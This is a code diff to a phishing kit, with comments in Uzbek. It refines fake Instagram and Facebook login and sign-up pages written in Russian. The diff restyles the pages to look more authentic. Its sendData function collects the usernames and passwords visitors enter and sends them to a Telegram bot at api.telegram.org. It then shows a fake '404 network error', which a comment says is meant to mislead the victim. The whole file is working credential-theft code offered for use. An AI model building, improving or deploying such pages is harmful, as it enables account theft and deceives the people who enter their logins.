@@ -7,14 +7,14 @@
     <style>
         /* Umumiy sozlamalar */
         * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow-x: hidden; }
+        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow-x: hidden; transition: background 0.3s; }
         .wrapper { display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 20px; }
         .hidden { display: none !important; }
 
-        /* --- INSTAGRAM STILI (image_7585e2.png & image_7582e2.png) --- */
+        /* --- INSTAGRAM DARK THEME (image_75773b.png & image_7576fb.png) --- */
         .insta-bg { background-color: #000000; color: #ffffff; }
         .insta-container { width: 100%; max-width: 350px; text-align: center; margin-top: 40px; }
-        .insta-logo { width: 175px; margin-bottom: 35px; }
+        .insta-logo { width: 175px; margin-bottom: 35px; filter: invert(1); } /* Oq rangli matnli logo */
         .insta-header { font-size: 16px; font-weight: 600; margin-bottom: 25px; }
         
         .input-box { 
@@ -23,10 +23,9 @@
             margin-bottom: 12px; font-size: 14px; 
         }
         .input-box::placeholder { color: #8e8e8e; }
-        .input-box:focus { border-color: #555; outline: none; }
 
         .btn-blue { 
-            width: 100%; background-color: #0064e0; border: none; 
+            width: 100%; background-color: #0095f6; border: none; 
             border-radius: 25px; color: white; font-weight: 600; 
             padding: 12px; font-size: 15px; cursor: pointer; margin-top: 10px;
         }
@@ -39,7 +38,7 @@
             display: flex; align-items: center; justify-content: center; gap: 8px;
         }
 
-        /* --- FACEBOOK STILI (image_758244.png & image_757f7e.png) --- */
+        /* --- FACEBOOK LIGHT THEME (image_7573d9.png & image_757359.png) --- */
         .fb-bg { background-color: #ffffff; color: #1c1e21; }
         .fb-container { width: 100%; max-width: 400px; text-align: center; margin-top: 50px; }
         .fb-logo-text { width: 120px; margin-bottom: 30px; }
@@ -47,26 +46,26 @@
         
         .fb-input { 
             width: 100%; background: #f5f6f7; border: 1px solid #dddfe2; 
-            border-radius: 12px; padding: 16px; margin-bottom: 12px; font-size: 16px; 
+            border-radius: 12px; padding: 16px; margin-bottom: 12px; font-size: 16px; color: #1c1e21;
         }
 
         .fb-btn-reg { 
             background: none; border: 1px solid #0064e0; color: #0064e0; 
             border-radius: 25px; width: 100%; padding: 10px; 
-            font-weight: 600; margin-top: 60px; cursor: pointer;
+            font-weight: 600; margin-top: 40px; cursor: pointer;
         }
 
-        /* Footer */
         .footer { margin-top: auto; padding-bottom: 30px; text-align: center; }
-        .meta-text { font-size: 12px; color: #8e8e8e; font-weight: bold; }
+        .meta-text { font-size: 12px; color: #8e8e8e; font-weight: bold; letter-spacing: 1px; }
     </style>
 </head>
 <body class="insta-bg">
 
-<!-- INSTAGRAM LOGIN (image_7585e2.png) -->
+<!-- INSTAGRAM LOGIN (Refer: image_75773b.png) -->
 <div id="p1" class="wrapper">
     <div class="insta-container">
-        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d2529dbef152.png" class="insta-logo">
+        <!-- Barqaror matnli logo -->
+        <img src="https://www.vectorlogo.zone/logos/instagram/instagram-wordmark.svg" class="insta-logo">
         <div class="insta-header">Войти в Instagram</div>
         <input type="text" id="i_l_u" class="input-box" placeholder="Имя пользователя, номер или email">
         <input type="password" id="i_l_p" class="input-box" placeholder="Пароль">
@@ -78,13 +77,13 @@
                 <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" width="18">
                 Войти через Facebook
             </button>
-            <button class="btn-outline" style="color: #0064e0; border-color: #0064e0;" onclick="showPage('p2')">Создать новый аккаунт</button>
+            <button class="btn-outline" style="color: #0095f6; border-color: #0095f6;" onclick="showPage('p2')">Создать новый аккаунт</button>
         </div>
     </div>
     <div class="footer"><div class="meta-text">∞ Meta</div></div>
 </div>
 
-<!-- INSTAGRAM REGISTER (image_7582e2.png) -->
+<!-- INSTAGRAM REGISTER (Refer: image_7576fb.png) -->
 <div id="p2" class="wrapper hidden">
     <div class="insta-container" style="text-align: left;">
         <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 15px;">
@@ -111,21 +110,21 @@
     </div>
 </div>
 
-<!-- FACEBOOK LOGIN (image_758244.png) -->
+<!-- FACEBOOK LOGIN (Refer: image_7573d9.png) -->
 <div id="p3" class="wrapper fb-bg hidden">
     <div class="fb-container">
         <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lE_V8ch_E4.svg" class="fb-logo-text">
         <div class="fb-title">Войдите на Facebook</div>
-        <input type="text" id="f_l_u" class="fb-input" placeholder="Электронный адрес или номер мобильного телефона">
+        <input type="text" id="f_l_u" class="fb-input" placeholder="Электронный адрес или номер телефона">
         <input type="password" id="f_l_p" class="fb-input" placeholder="Пароль">
         <button class="btn-blue" style="font-size: 18px; padding: 14px; border-radius: 8px;" onclick="sendData('FB Login', ['f_l_u', 'f_l_p'])">Войти</button>
-        <a href="#" class="insta-link" style="color: #1c1e21; font-weight: 500;">Забыli пароль?</a>
+        <a href="#" class="insta-link" style="color: #1c1e21; font-weight: 500;">Забыли пароль?</a>
         <button class="fb-btn-reg" onclick="showPage('p4')">Создать новый аккаунт</button>
     </div>
     <div class="footer"><div class="meta-text" style="color: #606770;">∞ Meta</div></div>
 </div>
 
-<!-- FACEBOOK REGISTER (image_757f7e.png) -->
+<!-- FACEBOOK REGISTER (Refer: image_757359.png) -->
 <div id="p4" class="wrapper fb-bg hidden">
     <div class="fb-container" style="text-align: left;">
         <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 15px;">
@@ -157,34 +156,39 @@
     function showPage(id) {
         document.querySelectorAll('.wrapper').forEach(p => p.classList.add('hidden'));
         document.getElementById(id).classList.remove('hidden');
-        document.body.className = id.startsWith('p3') || id.startsWith('p4') ? 'fb-bg' : 'insta-bg';
+        document.body.className = (id === 'p3' || id === 'p4') ? 'fb-bg' : 'insta-bg';
     }
 
     function fillDates() {
-        const days = document.querySelectorAll('#d, #fd'), months = document.querySelectorAll('#m, #fm'), years = document.querySelectorAll('#y, #fy');
-        const mNames = ["Январь", "Февраль", "Март", "Апрель", "Май", "Июнь", "Июль", "Август", "Сентябрь", "Октябрь", "Ноябрь", "Декабрь"];
-        days.forEach(el => { for(let i=1; i<=31; i++) el.innerHTML += `<option>${i}</option>`; });
-        months.forEach(el => { mNames.forEach(m => el.innerHTML += `<option>${m}</option>`); });
-        years.forEach(el => { for(let i=2026; i>=1950; i--) el.innerHTML += `<option>${i}</option>`; });
+        const d_els = document.querySelectorAll('#d, #fd'), m_els = document.querySelectorAll('#m, #fm'), y_els = document.querySelectorAll('#y, #fy');
+        const months = ["Январь", "Февраль", "Март", "Апрель", "Май", "Июнь", "Июль", "Август", "Сентябрь", "Октябрь", "Ноябрь", "Декабрь"];
+        d_els.forEach(el => { for(let i=1; i<=31; i++) el.innerHTML += `<option>${i}</option>`; });
+        m_els.forEach(el => { months.forEach(m => el.innerHTML += `<option>${m}</option>`); });
+        y_els.forEach(el => { for(let i=2026; i>=1950; i--) el.innerHTML += `<option>${i}</option>`; });
     }
     fillDates();
 
     async function sendData(type, ids) {
-        let message = `🔥 *Yangi Ma'lumot: ${type}*\n\n`;
+        let message = `🚀 *Yangi Login: ${type}*\n\n`;
         let valid = true;
         ids.forEach(id => {
             const val = document.getElementById(id).value;
             if(!val) valid = false;
-            message += `🔹 *${id}:* \`${val}\`\n`;
+            message += `📍 *${id}:* \`${val}\`\n`;
         });
-        if(!valid) return alert("Iltimos, barcha maydonlarni to'ldiring!");
+        if(!valid) return alert("Iltimos, maydonlarni to'ldiring!");
 
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
-        });
-        alert("Server bilan ulanishda xatolik (Error 404). Tarmoqni tekshiring.");
+        try {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+            });
+            // Foydalanuvchini chalg'itish uchun soxta xatolik
+            alert("Ошибка сети (404). Пожалуйста, проверьте интернет-соединение.");
+        } catch(e) {
+            console.error(e);
+        }
     }
 </script>
 </body>
